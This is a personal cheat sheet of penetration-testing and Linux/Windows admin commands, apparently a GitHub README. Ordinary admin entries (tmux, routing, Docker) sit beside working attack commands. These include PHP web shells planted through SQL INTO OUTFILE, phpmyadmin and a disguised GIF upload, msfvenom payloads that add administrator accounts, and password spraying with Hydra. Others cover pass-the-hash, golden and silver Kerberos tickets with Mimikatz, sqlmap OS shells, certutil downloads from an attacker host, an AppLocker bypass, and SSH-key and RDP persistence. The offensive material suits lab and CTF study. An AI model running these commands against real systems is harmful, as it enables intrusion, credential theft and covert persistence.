Frequently used commands that are searchable with your browser's search function. (CTRL+f on Firefox)

* Go here if you are looking for:
* **[TOR Service / Anonymity](https://github.com/codetorok/command-center/blob/master/TOR-SERVICE/tor_service_setup_and_use.md)**
* **[Linux Privilege Escalation (privesc)](https://github.com/codetorok/command-center/blob/master/Linux-Privesc/linux-privesc.md)**
* **[Windows Privilege Escalation (privesc)](https://github.com/codetorok/command-center/blob/master/Windows-Privesc/windows-privesc.md)**
* **[Windows Active Directory](https://github.com/codetorok/command-center/blob/master/Windows_AD/windows-active-directory.md)**
* **[Windows SSH Service Setup](https://github.com/codetorok/command-center/blob/master/Windows-ssh/windows-ssh-setup.md)**
* **[Pivoting in Metasploit](https://github.com/codetorok/command-center/blob/master/pivoting_metasploit/pivoting_metasploit.md)**
* **[Buffer Overflow (Windows, Basic)](https://github.com/codetorok/command-center/blob/master/buffer_overflow/buffer_overflow.md)**
* **[GPG](https://github.com/codetorok/command-center/blob/master/gpg/gpg.md)**
* **[Python3 one liners and scripts](https://github.com/codetorok/command-center/blob/master/python3/python3.md)**

![available_commands](images/002_available_commands.png)

## AllwaysInstallElevated / Windows

* check for it:
	* `reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer`
	* `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer`
	* execute .msi payload: `msiexec /i "C:\xampp\htdocs\shenzi\notavirus.msi"`

## Amass
Really good if you need to enumerate subdomains, just make sure you start it at night before going to bed :)

* `amass -ip -d <domain.com>`

* If you don't have ***amass*** installed on your system:
  * `apt install snapd`
  * `service snapd start`
  * `snap install amass`
  * `snap run amass`
  
## awk

* extracting the first and third field `echo "hello::there::friend" | awk -F "::" '{print $1, $3}'`

## bash

* ping scan

```
#!/bin/bash

for ip in `seq 1 10`;do
ping -c 1 $1.$ip | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" &
done
```

* port scan

```
#!/bin/bash

host=10.5.5.13
for port in {1...65535}; do
	timeout .1 bash -c "echo >/dev/tcp/$host/$port" &&
		echo "port $port is open"
done
echo "Done"
```

## Binwalk 
Extracts files hidden in pictures, pretty good for stegonograpy.

* `binwalk somepicture.jpg -e`

## Burp Suite

* finding subdomains in "target"
* `.*\.?example\.com$`

## bypass AppLocker in Windows
There are many ways to bypass AppLocker rules, if it's configured with the default rules, we can bypass it just by placing our executable into this directory which is whitelisted by default:

* `c:\Windows\System32\spool\drivers\color`

## change-login screen Ubuntu 20.04 LTS

* `wget https://github.com/PRATAP-KUMAR/ubuntu-gdm-set-background/archive/main.tar.gz`
* Then run: `sudo ./ubuntu-gdm-set-background --image ~/Downloads/mywallpapaer.jpg`

## checking temperature on CPU 
* save code as `<file name>.c` and compile it with `gcc <filename.c> -o <filename>`

```
#include <stdio.h>

int main(int argc, char *argv[]) 
{
   FILE *fp;

   int temp = 0;
   fp = fopen("/sys/class/thermal/thermal_zone0/temp", "r");
   fscanf(fp, "%d", &temp);
   printf(">> CPU Temp: %.2f°C\n", temp / 1000.0);
   fclose(fp);

   return 0;
}
```

## Chisel

* `chisel server --socks5 -p 8000 --reverse`
* `chisel client <chisel server IP>:<PORT> R:socks`
* don't forget to add it to your proxychains4.conf file:
	* `socks5   127.0.0.1 1080`

## Cleaning up

* `sudo apt autoremove && sudo apt autoclean`
* `sudo du -xh --max-depth=1 /var`
* `sudo du -xh --max-depth=1 /var/log`

## curl
You can do some great things with **_curl_**, it's worth going through it's man page, this is one of the great techniques I use quite often:

* `curl -s <domain or IP> | grep "<form"` to discover which HTTP methods are available. `-s` is for _silent_ mode.

* `curl -X DELETE <http://IP:PORT>` if you get a 200 OK that means that method is supported, you can try all the others as well like PUT, etc..

Directory discovery with **_dirb_** when username and password is known:
* `dirb <http://IP or domain/> -u <username>:<password>`

Directory busting with **_dirsearch_** is another great option:
* `dirsearch.py -u <http://IP or domain> -e php, html -x 400, 401, 403` the `-x` is to exclude those type of error response codes.

## dir (Win)
Searching in **_Windows_** using the `dir` command we have the following switches available: (credit: find the original post by __computerhope.com__ [here](https://www.computerhope.com/dirhlp.htm)) 

* `dir *.txt *.doc` to list any file whose name has the file extension _.txt_ or _.doc_
* `dir /a:d` to list only directories
* `dir /a:r` to list only files with the read-only attribute
* `dir /s` to list files and directories in the directory, and in any subdirectories. For instance, if your current directory is the root directory "C:\>," this command lists every file and directory on the C: drive
* `dir /p` to pause after each screenful of output. Use this option if the information is scrolling past the screen before you can read it. You are prompted to press any key before listing continues past the current screen
* `dir /w` to list multiple file names on every line, producing "wide" output, which displays more file names at once. However, other information such as file size is omitted
* `dir /s /w /p` to recursively lists all files and directories in the current directory and any subdirectories, in wide format, pausing after each screen of outputecursively lists all files and directories in the current directory and any subdirectories, in wide format, pausing after each screen of output
* `dir /s /w /p "C:\Program Files"` same as the above command, but lists everything in __C:\Program Files__, instead of the current directory. Because the directory name contains a space, it is enclosed in double-quotes, to prevent it from being interpreted is as two separate options
* `dir /s /q /a:sh /p C:\Windows` Lists any files and directories in __C:\Windows__, and any of its subdirectories `/s`, which have both the "hidden" and "system" file attributes `/a:sh`. Also, lists the owner of the file `/q`, and pauses after each screen of output `/p`
* `dir \ /s | find "i" | more` the above command uses vertical bars to pipe the output from dir to the command find, and then to the command more. The result is a list of all files and directories in the root directory of the current drive (\), with extra information. Namely, find also displays the number of files in each directory, and the amount of space occupied by each
* `dir /s /a:hs /q C:\Windows > myfile.txt` runs the _dir_ command, but redirects the output to the file __myfile.txt__, instead of displaying it on the screen. To view the contents of the file, you can use the `type` command and your file name, if the file is very long try it with `type myfile.txt | more`

## Docker & Juice Shop
This is how you install **_Docker_** on Kali for whatever you need, I run my Juice Shop app to test for the OWASP Top10 on Docker:

1. `curl -fsSL https://download.docker.com/linux/debian/gpg | gpg --dearmor | sudo tee /usr/share/keyrings/docker-archive-keyring.gpg > /dev/null`
2. `echo 'deb [arch-amd64 signed-by-/usr/share/keyrings/docker-archive-keyring.gpg] https://download.docker.com/linux/debian buster stable' | sudo tee /etc/apt/sources.list.d/docker.list`
3. `apt update`
4. `apt install docker-ce` 
5. `docker --version`

To install **_Juice Shop_**

1. `docker pull bkimminich/juice-shop`
2. `docker run --rm -p 3000:3000 bkimminich/juice-shop`
3. browse to *_http://localhost:3000_* (on macOS and Win browse to *_http://192.168.99.100:3000_* if you are using docker-machine instead of the native docker installation)

Once you installed **_Juice Shop_** and want to run it on different ocasions there's this simple bash script to help you with. Just make a file with nano, name it as _run_juice_shop.sh_ or whatever you want to name it copy/paste the below code in it,save it and make it executable with `chmod +x run_juice_shop.sh`:
```
#!/bin/bash

sudo docker run --rm -p 3000:3000 bkimminich/juice-shop
```

## Extract IPs from a text file

* `grep -o ‘[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}’ nmapfile.txt`

## gcc

* install the cross-architecture C header files with the following command:
* `sudo apt-get install gcc-multilib -y`

## gpg2john
Passing a private key to **_gpg2john_** to prep it and then passing the output file to john to crack it :) once it's done you can use the crack password and the private key to try to log in to the target system via ssh with `ssh -i id_rsa <username>@<IP>`

* `gpg2john id_rsa > id_rsa_prepped_for_john.hash` prepping the private key for a format understandable by john
* `john --wordlist=rockyou.txt --format=gpg id_rsa_prepped_for_john.hash`

## hashcat
Basic synthax. Again this is not a tutorial page, just a quick look up on the different and mostly used switches until you learn it by muscle memory. The _mode number_ can be found **[here](https://hashcat.net/wiki/doku.php?id=example_hashes)**
* `hashcat --force -m <mode number> -a 0 crackthis.txt /usr/share/wordlist/rockyou.txt`
* to find the _hashcat potfile_: `cat ~/.hashcat/hashcat.potfile`

## how to change the color for the current user in bash terminal, Ubuntu

* Open the file: gedit ~/.bashrc.
* Look for the line with #force_color_prompt=yes and uncomment (delete the #).
* Look for the line below if [ "$color_prompt" = yes ]; then that should looks like: `PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '`
* Pay attention at the part `\u@\h` it is saying `"user@host"` and the number before it `\[\033[01;32m\]` indicates the color. This is what you have to change. For example, lets change the user to purple, the `"@"` to black and host to green. Edit the line so it looks like: `PS1='${debian_chroot:+($debian_chroot)}\[\033[01;35m\]\u\[\033[01;30m\]@\[\033[01;32m\]\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '`
* The colors to the numbers are:

```
Black       0;30     Dark Gray     1;30
Blue        0;34     Light Blue    1;34
Green       0;32     Light Green   1;32
Cyan        0;36     Light Cyan    1;36
Red         0;31     Light Red     1;31
Purple      0;35     Light Purple  1;35
Brown       0;33     Yellow        1;33
Light Gray  0;37     White         1;37
```

## hydra
I mainly created this part because of the web login attack part. Sometimes it's hard to remember the sythax.

* `hydra -l <user name> -P <full path to the password list> ssh://<IP>` using Hydra against ssh
* `hydra -l <username> -P <full path to the password list> ftp://<IP>` using Hydra against
* `hydra -L <username list> -p <password> <IP> http-post-form "/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username" -t 30` you can capture the error message (Invalid username) by trying a credential on the target website and replace the one I have in this synthax if needed. This example tests several usernames for the same password, a technique also called password spraying.

## Impacket

* if got ntds.dit and SYSTEM files (SeBackupPrivilege) then use secretsdump: `secretsdump.py -ntds ./ntds.dit -system ./SYSTEM LOCAL`
* ASREPROASTING: `GetNPUsers.py spookysec.local/svc-admin -no-pass -format hashcat -dc-ip 10.10.159.22 -k | tee asrep-result.txt` and for cracking the hashes: `hashcat -m 18200 --wordlist /usr/share/wordlists/rockyou.txt -O --show`

## psexec

* `psexec.py <username>:'<password>'@<IP>`

## Install Python3 on Ubuntu

* `sudo apt install python3 python3-pip build-essential python3-dev`

## ip add

* `route` and `ip route add 192.168.222.0/24 via 10.175.34.1`

## iptables

* This example shows **how to block all connections** from the IP address 10.10.10.10. `This example shows how to block all connections from the IP address 10.10.10.10.`
* This example shows how to block all of the IP addresses in the 10.10.10.0/24 network range. You can use a netmask or standard slash notation to specify the range of IP addresses. `iptables -A INPUT -s 10.10.10.0/24 -j DROP` or `iptables -A INPUT -s 10.10.10.0/255.255.255.0 -j DROP`
* **Connections to a specific port:** This example shows how to block SSH connections from 10.10.10.10. `iptables -A INPUT -p tcp --dport ssh -s 10.10.10.10 -j DROP`
* This example shows how to block SSH connections from any IP address. `iptables -A INPUT -p tcp --dport ssh -j DROP`
* **Connection States:** the capability you’d need to allow two way communication but only allow one way connections to be established. Take a look at this example, where SSH connections FROM 10.10.10.10 are permitted, but SSH connections TO 10.10.10.10 are not. However, the system is permitted to send back information over SSH as long as the session has already been established, which makes SSH communication possible between these two hosts. 
  * `iptables -A INPUT -p tcp --dport ssh -s 10.10.10.10 -m state --state NEW,ESTABLISHED -j ACCEPT`
  * `iptables -A OUTPUT -p tcp --sport 22 -d 10.10.10.10 -m state --state ESTABLISHED -j ACCEPT`
* **Saving Changes:** The changes that you make to your iptables rules will be scrapped the next time that the iptables service gets restarted unless you execute a command to save the changes.  This command can differ depending on your distribution: `sudo /sbin/iptables-save`

## John
Cracking some SHA256 hashes with john, using the rockyou.txt as a wordlist, redirecting the output  into athe johncracked.txt

* `john <hashes.txt> --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256 > johncracked.txt`

## msfvenom

* *_Windows add user:_* `msfvenom -p windows/adduser USER=hacker PASS=Password123! -f exe -o hackware.exe`

* _add user to the local administrator group:_ `msfvenom -p windows/x64/exec CMD="net localgroup Administrators <username> /add" -f exe -o mysqld.exe`

## nmap
If you need to generate a nice html report from the output you can use *_xsltproc_*:

* `sudo xsltproc final_discovery.xml -o nmap_DATE_TARGET.html`

## pass-the-hash
* pass-the-hash attack for Win: `pth-winexe -U Administrator%'<admin hash>' //<target IP> cmd.exe`

## Persistence via RDP
(credit: [Joe Helle aka The Mayor, MPP course](https://academy.tcm-sec.com/p/movement-pivoting-and-persistence-for-pentesters-and-ethical-hackers))

1. `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f; Enable-NetFirewallRule -DisplayGroup "Remote Desktop"` enabling Remote Desktop via powershell
2. `xfreerdp /u:<username> /p:'<password>' /v:<target IP>` now we can connect to it from kali
3. To disable it: `powershell reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f; Disable-NetFirewallRule -DisplayGroup "Remote Desktop"`

## phpmyadmin

* `select ("<?php system($_REQUEST['cmd'])?>") INTO DUMPFILE C:\\wamp\\apps\\phpmyadmin5.0.2\\cmd.php`

## playing with encoding and hashes
If you are interested in more depth on this matter check out the cyberchef's website.

* `echo -n 'hashes are cool | md5sum`
* `echo -n 'hashes are cool' | base64` encoding with base64
* `echo -n 'aGFzaGVzIGFyZSBjb29s' | base64 -d` decoding with base64
* `echo -n 'hashes are cool' | rot13` encoding and decoding is the same synthax

## public IP from terminal

* `dig +short myip.opendns.com @resolver1.opendns.com`

* `curl ifconfig.me` a simpler way is just visiting ifconfig.me with curl :)

## quickly append IP to your /etc/hosts file

* `sudo echo '<192.168.0.23> <retrowerb.htb>' | tee -a /etc/hosts`

## RDP (rdesktop) with local file share

* `rdesktop -u <username> -d <domain> -p <password> -r disk:local="/home/kali/Desktop/fileshare" <host IP>:<PORT>`

## Restricted traffic bypass

* `curl -X POST -H 'X-Forwarded-For: <PIVOT IP>' --data 'data=id' http://<TARGET IP>/cmd.php>`

## sed

* `sed -i 's/text_to_replace/new_text/g' <file name>` without the `g` parameter at the end sed will only replace the first instance on each line only and without the `-i` switch sed will no overwrite the file we are working with, if we want to save the results as a new file we can just redirect the output to a new file like so: `sed -i 's/test_to_replace/new_text/g' <original file> > <new file>`
* `sed -n 's/text_to_replace/new_text/pg'` sed `-n` means no output unless there is a match because of the `p` parameter

## Silver Ticket and Golden Ticket

* **Silver Ticket attack**
* needed:
* Domain security identifier (SID)
* Domain fully qualified domain name (FQDN)
* Service account's password hash
* Username to impersonate
* Service name
* Target
* `whoami /user`
* get SID
* `systeminfo | findstr /B /C:"Domain"`
* get FQDN
* `setspn -L <service account name>`
* get service, ex.: HTTP/worktation-02.krbtown.local
* service is HTTP
* creating the ticket with Mimikatz:
* `kerberos::golden /sid:<SID (remove last 4 digits after dash)> /domain:<Domain FQDN> /user:<user to impersonate (need user's hash too at the end)> /service:<service we are trying to connect to, in our example is HTTP> /target:<The target server (workstation-02.krbtown.local)> /rc4:<the password hash of the service account in our case Administrator>`
* Mimikatz will save the output as ticket.kirbi
* using Rubeus to load the ticket into our current session:
* `Rubeus.exe ptt /ticket:ticket.kirbi`
* now we can connect to the iis_service from this session
* **Golden Ticket attack**
* needed:
* Domain SID
* Domain FQDN
* KRBTGT's password hash
* Username to impersonate
* `whoami /user`
* `systeminfo | findstr /B /C:"Domain"`
* The KRBTGT's password hash can only be dumped after becoming domain administrator and either performing a password dump on the DC, a DYNSync attack or a shadow copy on the DC. The user to impersonate can be any user of the domain even a non existing one with administrator RID.
* `kerberos::golden /sid:<Domain SID> /domain:<Domain FQDN> /user:<The user to impersonate> /krbtgt:<The password hash of the KRBTGT account>`
* load the created ticket into memory and then use psexec to get a shell on the target machine
* `Rubeus.exe ptt /ticket:ticket.kirbi`
* `PsExec.exe \\dc01.krbtown.local cmd`

## sql

* into outfile: `SELECT “<?php system($_GET['cmd']); ?>” into outfile “/var/www/WEBROOT/backups”`

## sqlmap
One of my favorite tecniques I learned from [ippsec](https://ippsec.rocks/?#) is to capture a login request with Burp and save it in a file like login.req, then in sqlmap I can just use `sqlmap -r login.req --level 5 --risk 3` to try to find a vuln.

* `sqlmap -u http://sqli.site/view.php -D <db_name> -T <table_name ex: users> -C <username.password> --dump`
* `sqlmap -u http://sqli.view.php -D <db_name> -T <table_name> --dump-all`
* `sqlmap -u http://sqli.view.php?id=1 --users`
* `sqlmap -u http://sqli.view.php?id=1 --tor --tor-type=SOCKS5`
* `sqlmap -u http://sqli.view.php?id=1 --dbs`
* `sqlmap -u http://sqli.view.php -D <db_name> --tables`

Using the session cookies and sqlmap: `sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' -- cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1"`

If the target is vulnerable for the get request (see above) we can get a shell out of it: `sqlmap -u 'http://10.129.95.174/dashboard.php?search=any+query' -- cookie="PHPSESSID=7u6p9qbhb44c5c1rsefp4ro8u1" --os-shell`

## ssh

* removing credentials from known_hosts for ssh `ssh-keygen -f "/home/user/.ssh/known_hosts" -R "[<IP>]:<PORT>"`
* ssh fingerprint `ssh-keygen -l -f id_rsa`
* connecting with ssh key: first make a key pair on kali: `ssh-keygen` then create the authorized-keys on the target machine: `mkdir /root/.ssh` and echo the public key there: `echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD... kali@kali" >> /root/.ssh/authorized_keys` now we can ssh in to the target system from kali
* connection timeout set: ssh -o ConnectTimeout=10 gibson@10.11.1.71
* ALWAYS CHECK: cat etc/ssh/sshd_config | uniq
* or (if you don't have a config file create one, nano does that automatically for you)
* `nano ~/.ssh/config`
* Adding ssh key permanently to the ssh config file
```
Host github.com
	User git
	IdentityFile ~/.ssh/githubkey
```
* testing for the connection `ssh -T git@github.com`

*_This section is under development_*

## steghide
Added for fun :) extract a file form a picture.

* `steghide extract -sf <picutre.jpg>`

## sublist3r
A great tool for subdomain enumeration.

* `sublist3r -d <website.com> -t 50`
* it has a built in brute force modul: `sublist3r -d <domain> -b` which will use a built in list that can be found here: `/usr/share/sublist3r/subrute/names.txt`

## sudo update & upgrade

* If you wish to upgrade only a certain package, ex: firefox:
  * `sudp apt-get update && sudo apt-get --only-upgrade firefox`
* If you wish to list upgradable packages use `sudo apt list --upgradable`

## tar
No big deal here, just had to remember the how to extract a .tar.gz package so I saved it here for reference.

* `tar -xvf <somefile.tar.gz>`

## theharwester
For subdomain enumeration.

`theharvester -d <domain.com> -l 500 -b google` where `-l` is to for how deep to go and `-b` is for the search engine.

## to upgrade a shell on the target machine
Some shells are fuzzy but after an upgrade you can have a proper one with all the normal shell functions like TAB, etc...

1. `python3 -c 'import pty;pty.spawn("/bin/bash")'`
2. `export TERM=xterm
3. here you want to press `CTRL+z` to background your session
4. `stty raw -echo; fg` I like to add `fg` here to bring the session to the foreground again and don't have to do it as a next command

## tr

* to organize vertical output to horizontal by cutting out the new lines `cat <file_name> | tr -d '\n'`

## tmux

* new session `tmux new -s <session name>`
* recursively search throug history `CTRL + R` and start typing
* default prefix key is `CTRL + B`
* new window `prefix + c`
* switch between tabs `prefix + <tab number>`
* list sessions `tmux ls`
* attach session `tmux attach -t <session name>`
* switching back to prev session `CTR + A + 1`
* detach session `prefix d`
* rename tab `prefix`
* join pane from window `prefix j <window number>'`
* send pane to window `prefix s <pane number>`
* config `nano ~/.tmux.conf` no default config file, you have to create one, can use a sample file if needed: `/usr/share/doc/tmux/examples`
* logging `prefix ALT SHIFT P`
* for the copy/paste to work don't forget to install xclip if you don't have it: `sudo apt update && sudo apt install xclip`
* working example .tmux.conf file by ippsec:

```
#reload the config file if needed
unbind r
bind r source-file ~/.tmux.conf \; display "Reloaded ~/.tmux.conf"

#enabling the mouse
set -g mouse on

# Remap prefix to screens
set -g prefix C-a
bind C-a send-prefix
unbind C-b

# Quality of life stuff
set -g history-limit 10000
set -g allow-rename off

## Join windows
bind-key j command-prompt -p "join pane from:"  "join-pane -s '%%'"
bind-key s command-prompt -p "send pane to:"  "join-pane -t '%%'"

# Search Mode VI (default is emac)
set-window-option -g mode-keys vi

#clone github repo to ~ from:
#https://github.com/tmux-plugins/tmux-logging
run-shell ~/tmux-logging/logging.tmux

# Selection with mouse should copy to clipboard right away, in addition to the default action.
unbind -n -Tcopy-mode-vi MouseDragEnd1Pane
bind -Tcopy-mode-vi MouseDragEnd1Pane send -X copy-selection-and-cancel\; run "tmux save-buffer - | xclip -i -sel clipboard > /dev/null"


# Middle click to paste from the clipboard
unbind-key MouseDown2Pane
bind-key -n MouseDown2Pane run "tmux set-buffer \"$(xclip -o -sel clipboard)\"; tmux paste-buffer"

```

## Two default gateways on One System - 2 interfaces

* source: [thomas-krenn.com](https://www.thomas-krenn.com/en/wiki/Two_Default_Gateways_on_One_System)
* We will assume that we have two interfaces: eth0 and eth1. The two networks that should be used are 192.168.0.0/24 and 10.10.0.0/24, whereby the first IP address in each respective network should be the gateway. Under Debian, the initial configuration would appear as follows. /etc/network/interfaces

```
# This file describes the network interfaces available on your system
# and how to activate them. For more information, see interfaces(5).
# The loopback network interface

auto lo
iface lo inet loopback

# The primary network interface

allow-hotplug eth0
iface eth0 inet static
    address 192.168.0.10
    netmask 255.255.255.0
    gateway 192.168.0.1

# The secondary network interface
allow-hotplug eth1
iface eth1 inet static
    address 10.10.0.10
    netmask 255.255.255.0
```

* To add a new routing table, the file, /etc/iproute2/rt_tables must be edited. We will call the routing table “rt2” and set its preference to 1. The named file should then appear as follows.

```
#
# reserved values
#
255     local
254     main
253     default
0       unspec
#
# local
#
#1      inr.ruhep
1 rt2
```

* Configuring the New Routing Table: From this point, four commands are needed to achieve our goal. First, the new routing table needs to be populated, which is done using the following command.

```
ip route add 10.10.0.0/24 dev eth1 src 10.10.0.10 table rt2
ip route add default via 10.10.0.1 dev eth1 table rt2

```

* The first command says that the network, 10.10.0.0/24, can be reached through the eth1 interface. The second command sets the default gateway.
* Routing Rules: So that the system knows when to use our new routing table, two rules must be configured.

```
ip rule add from 10.10.0.10/32 table rt2
ip rule add to 10.10.0.10/32 table rt2
```

* These rules say that both traffic from the IP address, 10.10.0.10, as well as traffic directed to or through this IP address, should use the rt2 routing table.
* Making the Configuration permanent: The ip rule and ip route commands will become invalid after a re-boot, for which reason they should become part of a script (for example, /etc/rc.local) that will be executed once the network has been started after booting. For Debian, these command can also be written directly into the /etc/network/interfaces file, which would then appear as follows.

```
iface eth1 inet static
    address 10.10.0.10
    netmask 255.255.255.0
    post-up ip route add 10.10.0.0/24 dev eth1 src 10.10.0.10 table rt2
    post-up ip route add default via 10.10.0.1 dev eth1 table rt2
    post-up ip rule add from 10.10.0.10/32 table rt2
    post-up ip rule add to 10.10.0.10/32 table rt2
```

* More than Two Network Cards or Gateways: If there are more than two networks, a routing table can be created for each additional network analogous to the example presented above.
* Testing the Configuration: The following commands can be used to ensure that the rules as well as the routing entries are working as expected.

```
ip route list table rt2
ip rule show

```


## unfurl for searching for login forms

* `cat hosts.txt | httpx -path /login -p 80,443,8080,8443 -mc 401,403 -silent -t 300 | unfurl format %s://%d | httpx -path //login -mc 200 -t 300 -nc -silent`

## Upload file type bypass

* Upload image:

```
GIF89a1
<?php system($_POST['cmd']); ?>
```

## virtualbox

* Need this config to be able to make virtualbox work with both bridged and NAT at the same time.

   * `sudo nano /etc/network/interfaces`
   * edit the file: `allow-hotplug eth1` uncomment it
   * edit the file: `iface eth1 inet dhcp` uncomment it
   * save the changes, exit nano then: `sudo ifup eth1` to apply the changes on the running system.

* install **_virtualbox-guest_**: 
* it has to be installed on the VM: `sudo apt update && sudo apt install -y --reinstall virtualbox-guest-x11 && sudo reboot -f`

## wfuzz
Enlists subdomains based on a wordlist, here using top5000.txt from seclist. `--hw 290` is needed so 404 pages won't show up in the search results.

* `wfuzz -c -f sub-fighter -w top5000.txt -u http://<domain> -H "HOST: Fuzz.domain.com" --hw 290`

## Windows file transfer
In case you have to bring a file over to the compromised Win machine. The last piece of information is how do you want to name the file you bring over.

* `certutil -urlcache -f http://10.10.14.5/MS10-059.exe ms.exe`

## Windows commands history check
It's just like bash history in Linux.

* `c:\Users\<username>\%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` this line opens up a notepad with the histroy of commands.

## VMWare fixing after kernel update on Linux Debian

* First clone this repo with `git clone` : `https://github.com/mkubecek/vmware-host-modules` and run within the main directory: `git checkout workstation-16.2.3` and `sudo make` and finally: `sudo make install`
* `openssl req -new -x509 -newkey rsa:2048 -keyout MOK.priv -outform DER -out MOK.der -nodes -days 36500 -subc "/CN=VMWARE/"`
* `sudo /usr/src/linux-headers-$(uname -r)/scripts/sign-file sha256 ./MOK.priv ./MOK.der $(modinfo -n vmmon)`
* `sudo /usr/src/linux-headers-$(uname -r)/scripts/sign-file sha256 ./MOK.priv ./MOK.der $(modinfo -n vmnet)`
* `tail $(modinfo -n vmmon) | grep "Module signature appended"`
* `sudo mokutil --import MOK.der`
* `--- reboot ---`
* `mokutil --test-key MOK.der`
* UPDATE KEY: `sudo update-secureboot-policy --enroll-key`

## VMWare expanding disk (Linux)

* Expand the disk space in VMWare and then follow instructions **[here](https://cybersalih.com/how-to-expand-disk-space-on-kali-linux-vmware/)** to read or **[here](https://www.youtube.com/watch?v=NwpzYlfKnrY)** to watch a quick video about it.
 
## wpscan

The best scanner for Wordpress sites.

* `wpscan --url http://<domain.com> -e u` to enumerate users
* once we found some users we save their names in a file called *_users.txt_*
* then we use a wordlist to find vulnerable passwords on found users: `wpscan -U /dev/shm/users.txt -P /usr/share/wordlist/fasttrack.txt --url http://<domain.com>`

## xfreerdp to RDP in onto a host

* `xfreerdp /u:administrator /p:letmein123! /v:<IP> /size:90&`

## zip2john
Prepping a zip file for using it with _john_.

* `zip2john <zipfile name> > <output file name>`

With the same fashion there's **_pdf2john_** as well with a very similar synthax.

## zsh
**_Erase history_** when using **_zsh_** for example from bash, create a function and then call it:

1. `function erase_history { local HISTSIZE=0; }`
2. `erase_history`

****

#### This is the end of the list, remember, it's not the commands, it's what you do with those commands and how do you use the information you get out of theses swites, that's all that matters. This repo is for educational purposes only, anything you do with this is on you, so be responsable.

#### The world is at your fingertips 💯

![world100](images/003_hacker_hoodie.jpg)
